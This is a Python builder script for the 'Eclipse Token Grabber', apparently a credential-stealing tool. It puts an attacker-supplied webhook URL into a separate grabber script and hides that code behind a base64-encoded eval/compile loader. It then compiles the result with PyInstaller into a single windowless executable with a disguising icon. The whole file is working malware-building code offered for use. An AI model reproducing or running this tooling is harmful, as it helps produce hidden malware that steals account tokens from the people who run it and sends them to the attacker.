from os import remove as delete_file, path
from sys import platform
from base64 import b64encode
from argparse import ArgumentParser
from subprocess import run, PIPE


TITLE = '''
    ███████╗ ██████╗██╗     ██╗██████╗ ███████╗███████╗     ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗
    ██╔════╝██╔════╝██║     ██║██╔══██╗██╔════╝██╔════╝    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
    █████╗  ██║     ██║     ██║██████╔╝███████╗█████╗      ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
    ██╔══╝  ██║     ██║     ██║██╔═══╝ ╚════██║██╔══╝      ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
    ███████╗╚██████╗███████╗██║██║     ███████║███████╗    ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
    ╚══════╝ ╚═════╝╚══════╝╚═╝╚═╝     ╚══════╝╚══════╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
\n        Made By Dimitris Kalopisis & Yuliy Mitryashkin | Twitter: @DKalopisis & @JM1k1
'''

ECLIPSE_GRABBER_PATH = path.join("code", "eclipse-grabber.py")


def check_os() -> str:
    if platform == "linux" or platform == "linux2":
        OS = "Linux"
    elif platform == "darwin":
        OS = "OSX"
    elif platform == "win32":
        OS = "Windows"
    else:
        OS = "Unknown"
    return OS


def build(webhook: str, out_file: str):
    code_file = open(ECLIPSE_GRABBER_PATH, 'r')
    code = code_file.read()
    code_file.close()

    libs = code[0:code.find("WEBHOOK")]
    content = code.replace("{WEBHOOK}", str(webhook))
    encoded = b64encode(content.encode())
    eval_code = f"eval(compile(b64decode({encoded}).decode(), '<string>', 'exec'))"

    build_file = open(out_file + ".py", 'w')
    build_file.write(libs)
    build_file.write(eval_code)
    build_file.close()

    if check_os() == "Linux":
        compile_command = ["wine",
                           "/root/.wine/drive_c/"
                           + "users/root/Local Settings/"
                           + "Application Data/Programs/"
                           + "Python/Python38-32/Scripts/"
                           + "pyinstaller.exe"]
    elif check_os() == "Windows":
        compile_command = ["venv/Scripts/pyinstaller.exe"]
    elif check_os() == "OSX":
        compile_command = ["pyinstaller"]
    else:
        exit("\n[-] OS not supported\n")

    compile_command += [out_file + ".py",
                        "--onefile",
                        "--noconsole",
                        f"--icon={path.join('img','exe_file.ico')}"]

    try:
        command_result = run(compile_command, stdout=PIPE, stderr=PIPE)
        result = str(command_result.stderr).replace("b\"", "").replace(r'\n', '\n').replace(r'\r', '\r')
        if "completed successfully" not in result:
            raise Exception(result.splitlines()[-2])
    except Exception as error:
        raise exit(f"\n[-] Build Error: {error}")

    try:
        delete_file(out_file+".py")
        delete_file(out_file+".spec")
    except (FileNotFoundError, PermissionError):
        pass


def getArgs():
    parser = ArgumentParser(description='Eclipse Token Grabber')
    parser.add_argument('-w', '--webhook',
                        help='add your webhook url',
                        default='',
                        required=True)
    parser.add_argument('-o', '--outfile',
                        help='name your executable',
                        default='',
                        required=True)
    return parser.parse_args()


def main(args):
    print(TITLE)
    print("\n[+] Generating Eclipse Token Grabber, please wait...")
    build(args.webhook, args.outfile)
    print("\n\n[+] Succesfully Builded Eclipse Token Grabber",
          "\n\n[+] You can find it inside the dist directory")


if __name__ == "__main__":
    main(getArgs())
